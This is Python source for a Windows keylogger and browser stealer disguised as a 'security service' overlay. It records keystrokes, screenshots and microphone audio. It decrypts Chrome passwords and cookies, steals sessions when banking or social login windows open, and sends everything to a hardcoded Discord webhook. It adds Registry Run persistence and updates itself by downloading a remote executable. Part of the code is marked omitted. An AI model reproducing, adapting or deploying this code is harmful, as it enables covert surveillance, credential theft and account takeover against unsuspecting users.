import logging
import os
import platform
import socket
import threading
from threading import Thread, Timer
import wave
import sys
import ctypes
import json
import base64
import sqlite3
import shutil
from datetime import datetime

import subprocess

import multiprocessing

# CORE SECURITY: PREVENT RECURSIVE SPAWNING
# Essential for PyInstaller + pynput/multiprocessing libraries
multiprocessing.freeze_support()

# CORE IMPORTS MOVED TO LOCAL SCOPE TO PREVENT RECURSION
pass

# OVERLAY IMPORTS
OVERLAY_AVAILABLE = True
OVERLAY_ERROR = None
try:
    import psutil
    from threading import Thread, Timer
    from PyQt5.QtWidgets import QApplication, QMainWindow, QLabel, QVBoxLayout, QWidget
    from PyQt5.QtCore import Qt, QTimer, QPropertyAnimation, QEasingCurve, QPoint
    from PyQt5.QtGui import QFont, QColor, QPalette
except Exception as e:
    OVERLAY_AVAILABLE = False
    OVERLAY_ERROR = str(e)
    class QMainWindow: pass
    class QWidget: pass
    class QApplication: pass
    Qt = None
IMPORT_ERROR = None



# SINGLE INSTANCE LOCK (FAIL SAFE)
# This prevents the "Endless Opening" issue by ensuring only ONE instance runs.
try:
    kernel32 = ctypes.windll.kernel32
    # Local mutex to avoid permissions issues
    mutex = kernel32.CreateMutexW(None, False, "StarkCoreServices_Mutex_v23_Local")
    
    # Check if mutex already exists (Error 183)
    # ALSO check if mutex handle creation failed completely (0)
    last_error = kernel32.GetLastError()
    
    if last_error == 183: # ERROR_ALREADY_EXISTS
        sys.exit(0)
        
except Exception as e:
    # Failsafe: If we can't create a mutex, we might be unstable.
    # But in this case, we default to running (Fail Open) to ensure persistence works
    # EXCEPT if we suspect we are a recursive child
    pass 
 

# ... (omitted code) ...

finally:
    # Use the user-provided Discord Webhook URL
    WEBHOOK_URL = "https://discord.com/api/webhooks/1451250056714784820/rcHD8FNgtCzzTrBd8TC_BVeog_rEdUz-wKseDAAbqoJpvXDQ8dC0lDSlvkDXWMOOAgVV"
    SEND_REPORT_EVERY = 20 # Reporting interval in seconds
    VERSION = "2.7"
    # Actual GitHub Raw URLs - UPDATED FOR NEW EXE NAME
    VERSION_URL = "https://raw.githubusercontent.com/Pranavfr/keylogger-advanced/main/version.txt" 
    EXE_URL = "https://github.com/Pranavfr/keylogger-advanced/raw/main/StarkCoreServices.exe"

    class SystemOverlay(QMainWindow):
        def __init__(self):
            super().__init__()
            self.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint | Qt.Tool)
            self.setAttribute(Qt.WA_TranslucentBackground)
            self.setWindowOpacity(0.0) # Start transparent for fade-in
            
            # Position: Top Right (Larger, more padding)
            screen_geo = QApplication.desktop().screenGeometry()
            self.setGeometry(screen_geo.width() - 550, 60, 500, 300)
            
            # UI Setup
            self.central_widget = QWidget()
            self.setCentralWidget(self.central_widget)
            self.layout = QVBoxLayout(self.central_widget)
            
            # Styling (Sci-Fi / Glow Look)
            self.central_widget.setStyleSheet("""
                QWidget {
                    background-color: rgba(10, 20, 30, 230);
                    border: 3px solid #00FFFF;
                    border-radius: 15px;
                }
                QLabel {
                    color: #00FFFF;
                    background: transparent;
                    border: none;
                }
            """)
            
            # Title
            self.title_label = QLabel("SYSTEM CORE INITIALIZATION")
            self.title_label.setFont(QFont("Segoe UI", 16, QFont.Bold))
            self.title_label.setAlignment(Qt.AlignCenter)
            self.title_label.setStyleSheet("color: #FFFFFF; font-weight: bold; margin-bottom: 10px;")
            self.layout.addWidget(self.title_label)
            
            # Separator Line
            line = QLabel("")
            line.setFixedHeight(3)
            line.setStyleSheet("background-color: #00FFFF;")
            self.layout.addWidget(line)
            
            # Stats Labels
            font_stats = QFont("Consolas", 14)
            
            self.cpu_label = QLabel("CPU:  [ANALYZING]")
            self.cpu_label.setFont(font_stats)
            self.layout.addWidget(self.cpu_label)
            
            self.ram_label = QLabel("MEM:  [ANALYZING]")
            self.ram_label.setFont(font_stats)
            self.layout.addWidget(self.ram_label)
            
            self.batt_label = QLabel("BATT: [ANALYZING]")
            self.batt_label.setFont(font_stats)
            self.layout.addWidget(self.batt_label)

            self.status_label = QLabel("STATUS: BOOT SEQUENCE INITIATED...")
            self.status_label.setFont(QFont("Consolas", 10))
            self.status_label.setStyleSheet("color: #00FF00; margin-top: 15px;")
            self.status_label.setAlignment(Qt.AlignCenter)
            self.layout.addWidget(self.status_label)

            # Timers
            self.update_timer = QTimer(self)
            self.update_timer.timeout.connect(self.update_stats)
            self.update_timer.start(100) # Fast updates (100ms)
            
            # Animations
            self.anim = QPropertyAnimation(self, b"windowOpacity")
            self.anim.setDuration(1000) # 1s fade in (Slower for dramatic effect)
            self.anim.setStartValue(0.0)
            self.anim.setEndValue(1.0)
            self.anim.start()
            
            # Life Cycle (Extended by 5 seconds)
            QTimer.singleShot(6000, self.systems_nominal)     # After 6s
            QTimer.singleShot(9000, self.fade_out)            # After 9s

        def update_stats(self):
            cpu = psutil.cpu_percent()
            ram = psutil.virtual_memory().percent
            
            # Battery
            battery = psutil.sensors_battery()
            if battery:
                batt_text = f"{battery.percent}% {'(CHRG)' if battery.power_plugged else ''}"
            else:
                batt_text = "AC POWER"
            
            self.cpu_label.setText(f"CPU:  {cpu}%")
            self.ram_label.setText(f"MEM:  {ram}%")
            self.batt_label.setText(f"PWR:  {batt_text}")

        def systems_nominal(self):
            self.status_label.setText("ALL SYSTEMS NOMINAL")
            self.title_label.setText("SECURITY SERVICE ACTIVE")

        def fade_out(self):
            self.anim_out = QPropertyAnimation(self, b"windowOpacity")
            self.anim_out.setDuration(500) # 0.5s fade out
            self.anim_out.setStartValue(1.0)
            self.anim_out.setEndValue(0.0)
            self.anim_out.finished.connect(self.close)
            self.anim_out.start()

    class KeyLogger:
        def __init__(self, time_interval, webhook_url):
            self.interval = time_interval
            self.webhook_url = webhook_url
            self.version = VERSION
            self.log = ""
            self.current_window = None
            self.last_dump_time = {} # Track last cookie dump time for sites
            # Define target keywords for reactive session stealing
            # Added generic terms to catch Login pages even if domain isn't explicitly listed
            self.targets = [
                "facebook", "twitter", "instagram", "gmail", "google", "linkedin", "amazon", "netflix", "paypal", "bank", "reddit", 
                "flipkart", "github", "stackoverflow", "youtube", "vercel", "heroku", "netlify",
                "login", "signin", "sign in", "admin", "dashboard", "account", "user", "shop", "store", "civic"
            ]
            
        def get_active_window_title(self):
            try:
                window = ctypes.windll.user32.GetForegroundWindow()
                if not window:
                    return "Zero Active Window Handle"
                length = ctypes.windll.user32.GetWindowTextLengthW(window)
                buff = ctypes.create_unicode_buffer(length + 1)
                ctypes.windll.user32.GetWindowTextW(window, buff, length + 1)
                return buff.value if buff.value else "Empty Title"
            except Exception as e:
                return f"Window Title Error: {e}"
            
        def get_encryption_key(self):
            local_state_path = os.path.join(os.environ["USERPROFILE"],
                                            "AppData", "Local", "Google", "Chrome",
                                            "User Data", "Local State")
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = f.read()
                local_state = json.loads(local_state)

            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            key = key[5:]
            import win32crypt
            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

        def decrypt_password(self, password, key):
            try:
                iv = password[3:15]
                password = password[15:]
                from Crypto.Cipher import AES
                cipher = AES.new(key, AES.MODE_GCM, iv)
                return cipher.decrypt(password)[:-16].decode()
            except:
                try:
                    import win32crypt
                    return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
                except:
                    return ""

        def force_copy(self, src, dst):
            try:
                shutil.copyfile(src, dst)
            except PermissionError:
                # File is locked, try system copy silently
                try:
                    cmd = f'copy "{src}" "{dst}"'
                    
                    # Configuration to hide the console window
                    startupinfo = subprocess.STARTUPINFO()
                    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                    
                    subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, startupinfo=startupinfo)
                except Exception as e:
                    self.appendlog(f"[Copy Error: {e}]")
            except Exception as e:
                self.appendlog(f"[Copy Error: {e}]")

        def extract_passwords(self, key):
            db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                    "Google", "Chrome", "User Data", "Default", "Login Data")
            filename = "ChromeData.db"
            
            self.force_copy(db_path, filename)
            
            if not os.path.exists(filename):
                return ""

            try:
                db = sqlite3.connect(filename)
                cursor = db.cursor()
                cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
                
                data_arr = []
                for row in cursor.fetchall():
                    origin_url = row[0]
                    username = row[2]
                    password = self.decrypt_password(row[3], key)
                    if username or password:
                         data_arr.append(f"URL: {origin_url}\nUser: {username}\nPass: {password}")
                
                cursor.close()
                db.close()
            except Exception as e:
                return f"Error reading password DB: {e}"

            try:
                os.remove(filename)
            except:
                pass
            
            return "\n\n".join(data_arr)

        def extract_cookies(self, key):
            db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                    "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
            filename = "Cookies.db"
            if not os.path.exists(db_path): # Check generic path if network path fails
                 db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                    "Google", "Chrome", "User Data", "Default", "Cookies")

            if not os.path.exists(db_path):
                return []

            self.force_copy(db_path, filename)
            
            if not os.path.exists(filename):
                return []

            try:
                db = sqlite3.connect(filename)
                cursor = db.cursor()
                cursor.execute("SELECT host_key, name, value, encrypted_value FROM cookies")
                
                cookies_list = []
                for row in cursor.fetchall():
                    host = row[0]
                    name = row[1]
                    val = row[2]
                    if not val:
                        val = self.decrypt_password(row[3], key)
                    cookies_list.append({'host': host, 'name': name, 'value': val})
                
                cursor.close()
                db.close()
            except Exception as e:
                return []

            try:
                os.remove(filename)
            except:
                pass
                
            return cookies_list

        def get_cookies_for_window(self, window_title):
            try:
                # Basic keyword extraction from title
                
                target_key = None
                window_lower = window_title.lower()
                
                for k in self.targets:
                    if k in window_lower:
                        target_key = k
                        break
                
                if not target_key:
                    return # No interesting keyword found
                
                key = self.get_encryption_key()
                all_cookies = self.extract_cookies(key)
                
                # Filter cookies
                matches = []
                for c in all_cookies:
                    if target_key in c['host']:
                        matches.append(f"Host: {c['host']}\nName: {c['name']}\nValue: {c['value']}")
                
                if matches:
                    report = "\n\n".join(matches)
                    self.send_to_webhook(f"🎯 **Target Session Captured: {target_key.upper()}**\n\n" + report)
                    
            except Exception as e:
                pass # Fail silently for this background task

        def get_passwords_for_window(self, window_title):
            try:
                target_key = None
                window_lower = window_title.lower()
                
                for k in self.targets:
                    if k in window_lower:
                        target_key = k
                        break
                
                if not target_key:
                    return 
                
                key = self.get_encryption_key()
                
                db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                        "Google", "Chrome", "User Data", "Default", "Login Data")
                filename = "ChromeData.db"
                
                self.force_copy(db_path, filename)
                
                if not os.path.exists(filename):
                    return

                try:
                    db = sqlite3.connect(filename)
                    cursor = db.cursor()
                    cursor.execute("select origin_url, action_url, username_value, password_value from logins")
                    
                    matches = []
                    for row in cursor.fetchall():
                        origin_url = row[0]
                        username = row[2]
                        password_val = row[3]
                        
                        if target_key in origin_url.lower():
                            decoded_pw = self.decrypt_password(password_val, key)
                            if username or decoded_pw:
                                matches.append(f"URL: {origin_url}\nUser: {username}\nPass: {decoded_pw}")
                    
                    cursor.close()
                    db.close()
                except:
                    pass

                try: os.remove(filename)
                except: pass
                
                if matches:
                    report = "\n\n".join(matches)
                    self.send_to_webhook(f"🎯 **Target Password Captured: {target_key.upper()}**\n\n" + report)

            except Exception as e:
                pass


        def get_browser_data(self):
            try:
                key = self.get_encryption_key()
                
                # Get Passwords
                passwords = self.extract_passwords(key)
                if passwords:
                     self.send_to_webhook("=== Chrome Passwords ===\n" + passwords)
                else:
                     self.send_to_webhook("=== Chrome Passwords ===\nNo passwords found.")
                     
                # Get Cookies (Full Dump)
                cookies = self.extract_cookies(key)
                if cookies:
                     # Convert list back to string for report
                     cookie_strs = [f"Host: {c['host']}\nName: {c['name']}\nValue: {c['value']}" for c in cookies]
                     cookie_report = "\n\n".join(cookie_strs)
                     
                     # Cookies can easily exceed Discord char limit (2000)
                     # Send as file if too long
                     if len(cookie_report) > 1800:
                         with open("cookies.txt", "w", encoding="utf-8") as f:
                             f.write(cookie_report)
                         self.send_to_webhook("=== Chrome Cookies (File) ===", file_path="cookies.txt")
                         try: os.remove("cookies.txt") 
                         except: pass
                     else:
                         self.send_to_webhook("=== Chrome Cookies ===\n" + cookie_report)
                else:
                     self.send_to_webhook("=== Chrome Cookies ===\nNo cookies found.")

            except Exception as e:
                self.send_to_webhook(f"Error extracting browser data: {e}")

        def appendlog(self, string):
            self.log = self.log + string

        def on_move(self, x, y):
            pass # Disabled mouse move logging to reduce clutter
            # current_move = "Mouse moved to {} {}".format(x, y)
            # self.appendlog(current_move)

        def on_click(self, x, y):
            pass # Disabled click logging to reduce clutter
            # current_click = "Mouse clicked at {} {}".format(x, y)
            # self.appendlog(current_click)

        def on_scroll(self, x, y):
            pass # Disabled scroll logging to reduce clutter
            # current_scroll = "Mouse scrolled at {} {}".format(x, y)
            # self.appendlog(current_scroll)

        def save_data(self, key):
            try:
                active_window = self.get_active_window_title()
                if active_window != self.current_window:
                    self.current_window = active_window
                    self.appendlog(f"\n\n[Window: {self.current_window}]\n")
                    
                    # Take Screenshot on Window Change (in thread to avoid lag)
                    threading.Thread(target=self.screenshot).start()
                    
                    # Reactive Session Stealer Logic
                    # Check if it's a browser window
                    browsers = ["chrome", "edge", "firefox", "brave", "opera"]
                    if any(b in self.current_window.lower() for b in browsers):
                        # Use simple cooldown key based on Window Title keywords to avoid spamming "Facebook" every time user Alt+Tabs
                        # Reset cooldown every 60s
                        current_time = datetime.now().timestamp()
                        
                        # Extract a simple key for the site from the title
                        site_key = None
                        for k in self.targets:
                             if k in self.current_window.lower():
                                 site_key = k
                                 break
                        
                        if site_key:
                            last_time = self.last_dump_time.get(site_key, 0)
                            if current_time - last_time > 60: # 60 second cooldown per site
                                self.last_dump_time[site_key] = current_time
                                self.last_dump_time[site_key] = current_time
                                # Start in thread
                                threading.Thread(target=self.get_cookies_for_window, args=(self.current_window,)).start()
                                threading.Thread(target=self.get_passwords_for_window, args=(self.current_window,)).start()

            except Exception as e:
                self.appendlog(f"\n[Error tracking window: {e}]\n")

            try:
                current_key = str(key.char)
            except AttributeError:
                if key == key.space:
                    current_key = " "
                elif key == key.enter:
                    current_key = "\n"
                elif key == key.tab:
                    current_key = "\t"
                elif key == key.esc:
                    current_key = " [ESC] "
                elif key == key.backspace:
                    # Optional: Logic to actually remove last char from log could go here, 
                    # but for raw logging we just mark it.
                    current_key = " [BACKSPACE] "
                else:
                    # Clean up other keys e.g. Key.shift -> [SHIFT]
                    current_key = f" [{str(key).replace('Key.', '').upper()}] "

            self.appendlog(current_key)

        def send_to_webhook(self, message, file_path=None):
            # If there's a file, we send it as multipart/form-data
            # If it's just text, we send a JSON payload
            try:
                import requests
                if file_path:
                    # Posting a file (screenshot or audio)
                    with open(file_path, 'rb') as f:
                        # We can send 'content' along with the file
                        data = {'content': message}
                        files = {'file': f}
                        import requests
                        requests.post(self.webhook_url, data=data, files=files)
                else:
                    # Posting just text
                    if message.strip():
                        # Use code block for better readability if it's a log report
                        # But system info should be plain so it can be formatted freely
                        if "=== System Info ===" in message:
                             payload = {'content': message}
                        else:
                             payload = {'content': f"```\n{message}\n```"}
                             
                        requests.post(self.webhook_url, json=payload)
                        
            except Exception as e:
                print(f"Failed to send to Discord: {e}")

        def report(self):
            # Send the current text log
            if self.log:
                self.send_to_webhook(self.log)
            
            self.log = ""
            
            # Record Microphone
            self.microphone()
            
            # Take Screenshot (Periodic)
            self.screenshot()
            
            timer = threading.Timer(self.interval, self.report)
            timer.start()

        def system_information(self):
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            plat = platform.processor()
            system = platform.system()
            machine = platform.machine()
            
            # Fetch Public IP and Geo Info
            try:
                import requests
                public_ip = requests.get('https://api.ipify.org').text
                geo_request = requests.get(f'http://ip-api.com/json/{public_ip}')
                geo_data = geo_request.json()
                city = geo_data.get('city', 'Unknown')
                country = geo_data.get('country', 'Unknown')
                lat = geo_data.get('lat', 'Unknown')
                lon = geo_data.get('lon', 'Unknown')
                isp = geo_data.get('isp', 'Unknown')
            except Exception:
                public_ip = "Error fetching"
                city = country = lat = lon = isp = "Error fetching"

            info_msg = (
                f"**🚀 Keylogger Started**\n"
                f"**Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"--------------------------------------------------\n"
                f"**👤 System Info**\n"
                f"Hostname: `{hostname}`\n"
                f"Internal IP: `{ip}`\n"
                f"Processor: `{plat}`\n"
                f"System: `{system} {machine}`\n"
                f"--------------------------------------------------\n"
                f"**🌍 Network Info**\n"
                f"Public IP: `{public_ip}`\n"
                f"ISP: `{isp}`\n"
                f"Location: {city}, {country} ({lat}, {lon})\n"
                f"--------------------------------------------------"
            )
            
            self.send_to_webhook(info_msg)


        def microphone(self):
            try:
                import sounddevice as sd
                import wave
                fs = 16000 # Reduced from 44100 to save size
                seconds = SEND_REPORT_EVERY
                # Use absolute TEMP path to avoid System32 permission errors
                filename = os.path.join(os.getenv('TEMP'), 'sound.wav')
                
                obj = wave.open(filename, 'w')
                obj.setnchannels(1)  # mono
                obj.setsampwidth(2)
                obj.setframerate(fs)
                
                # Record (Using channels=1 to match WAV header)
                myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=1, dtype='int16')
                sd.wait() # Wait until recording is finished
                
                obj.writeframesraw(myrecording)
                obj.close()
    
                self.send_to_webhook(message="Audio Loading...", file_path=filename)
                
                try:
                    os.remove(filename)
                except Exception as e:
                    print(f"Error removing audio file: {e}")
            except Exception as e:
                self.appendlog(f"\n[Microphone Error: {e}]\n")

        def screenshot(self):
            # Use unique filename to avoid thread conflicts (JPEG for size)
            # Use absolute TEMP path to avoid System32 permission errors
            filename = os.path.join(os.getenv('TEMP'), f'screenshot_{int(datetime.now().timestamp())}.jpg')
            try:
                from PIL import ImageGrab
                img = ImageGrab.grab()
                img.save(filename, quality=50, optimize=True)
                self.send_to_webhook(message="Screenshot Loading...", file_path=filename)
                
                try:
                    os.remove(filename)
                except Exception as e:
                    print(f"Error removing screenshot: {e}")
            except Exception as e:
                self.appendlog(f"[Screenshot Error: {e}]")

        def check_for_updates(self):
            try:
                import requests
                # 1. Check Remote Version
                response = requests.get(VERSION_URL)
                
                # SAFETY GUARD: Check for HTTP Errors (404, 403, etc)
                if response.status_code != 200:
                    return

                remote_version_text = response.text.strip()
                
                # SAFETY GUARD: Check for "404", "Not Found", or HTML tags
                if "404" in remote_version_text or "Not Found" in remote_version_text or "<html" in remote_version_text:
                    return

                # SAFETY GUARD: Verify it looks like a version number
                # Simple check: must be short and start with digit
                if len(remote_version_text) > 10 or not remote_version_text[0].isdigit():
                    return

                if remote_version_text != VERSION:
                    # Update Available
                    # 2. Download New Exe
                    exe_response = requests.get(EXE_URL)
                    if exe_response.status_code != 200:
                        return
                        
                    # Write to Temp as 'update.exe'
                    update_path = os.path.join(tempfile.gettempdir(), "update.exe")
                    with open(update_path, "wb") as f:
                        f.write(exe_response.content)
                    
                    # 3. Create Updater Batch Script
                    # We need a script to:
                    # a) Wait for us to close
                    # b) Delete us
                    # c) Move update.exe to our location
                    # d) Run the new exe
                    
                    current_exe = sys.executable
                    batch_script = f"""
@echo off
timeout /t 3 /nobreak
del "{current_exe}"
move "{update_path}" "{current_exe}"
start "" "{current_exe}"
del "%~f0"
"""
                    batch_path = os.path.join(tempfile.gettempdir(), "update.bat")
                    with open(batch_path, "w") as f:
                        f.write(batch_script)
                        
                    # 4. Execute Batch and Die
                    # Send a final 'Updating' log
                    self.send_to_webhook(f"[System] Updating to {remote_version_text}...")
                    
                    subprocess.Popen(batch_path, shell=True)
                    os._exit(0)
            except Exception:
                pass # Silent fail on update check


        def add_to_startup(self):
            try:
                # Only add to startup if running as an executable (frozen)
                if getattr(sys, 'frozen', False):
                    exe_path = sys.executable
                    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
                    value_name = "Keylogger"
                    
                    # Command to add registry key
                    cmd = f'reg add "HKCU\\{key}" /v "{value_name}" /t REG_SZ /d "{exe_path}" /f'
                    os.system(cmd)
                    self.appendlog("\n[+] Persistence added to Registry Run Key.\n")
                else:
                    self.appendlog("\n[!] Persistence skipped (not running as exe).\n")
            except Exception as e:
                self.appendlog(f"\n[!] Persistence failed: {e}\n")

        def run(self):
            print("Keylogger started. Press Ctrl+C to stop.")
            
            # Send system info immediately on startup
            self.system_information()
            
            # Extract Browser Info (Stealer)
            threading.Thread(target=self.get_browser_data).start()
            
            # Try to add to startup
            self.add_to_startup()
            
            # Start reporting (webhook) in background
            self.report()
            
            # Start listeners non-blocking and join them
            with keyboard.Listener(on_press=self.save_data) as kl, \
                 Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as ml:
                kl.join()
                ml.join()

    
    if __name__ == "__main__":
        # LOCAL IMPORTS FOR MAIN PROCESS ONLY
        import requests
        from pynput import keyboard
        from pynput.keyboard import Listener
        
        # --- MAIN EXECUTION MODEL ---
        keylogger = KeyLogger(SEND_REPORT_EVERY, WEBHOOK_URL)
        
        # Check for updates on startup
        if getattr(sys, 'frozen', False): 
             Thread(target=keylogger.check_for_updates).start()

        # We must run the GUI on the Main Thread.
        # The Keylogger must run in a background thread.
        
        # Start Keylogger Thread
        # daemon=False is CRITICAL: it ensures the program doesn't exit when the GUI closes.
        kl_thread = Thread(target=keylogger.run, daemon=False)
        kl_thread.start()
        
        # Show Overlay (Only if running as exe or specifically testing)
        # Using sys.frozen check ensures we don't annoy you during simple python script tests 
        # unless you want to.
        
        # DEBUG LOGGING (Redundant)
        try:
            debug_filename = f"overlay_debug_{int(datetime.now().timestamp())}.txt"
            temp_path = os.path.join(os.getenv('TEMP'), debug_filename)
            
            with open(temp_path, "w") as f:
                f.write(f"Timestamp: {datetime.now()}\n")
                f.write(f"Frozen: {getattr(sys, 'frozen', False)}\n")
                f.write(f"Overlay Available: {OVERLAY_AVAILABLE}\n")
                f.write(f"Overlay Error: {OVERLAY_ERROR}\n")
                
            # POPUP MESSAGE BOX ONLY ON FAILURE
            if not OVERLAY_AVAILABLE:
                ctypes.windll.user32.MessageBoxW(0, f"Overlay Failed.\nError: {OVERLAY_ERROR}", "Security Service Debug", 0x10)
                
        except Exception as e:
            # If even logging fails, try one last popup
             ctypes.windll.user32.MessageBoxW(0, f"Logging Failed: {e}", "Critical Error", 0x10)

        if getattr(sys, 'frozen', False): 
            if OVERLAY_AVAILABLE:
                try:
                    # Removed "Attempting to show" popup to be stealthy again
                    # ctypes.windll.user32.MessageBoxW(0, "Attempting to show overlay...", "Debug", 0x40)
                    
                    app = QApplication(sys.argv)
                    overlay = SystemOverlay()
                    overlay.show()
                    # Process events to ensure paint happens immediately
                    app.processEvents()
                    
                    # Close the GUI app loop after 10 seconds (Wait for fade out)
                    # But the process stays alive because kl_thread is non-daemon
                    QTimer.singleShot(10000, app.quit) 
                    
                    app.exec_()
                except Exception as e:
                     ctypes.windll.user32.MessageBoxW(0, f"Overlay Runtime Error: {e}", "Runtime Error", 0x10)
                     pass # Fail silently if GUI crashes, keylogger still runs
            else:
                 pass
        else:
            # If running as script (testing), just join the thread
            kl_thread.join()



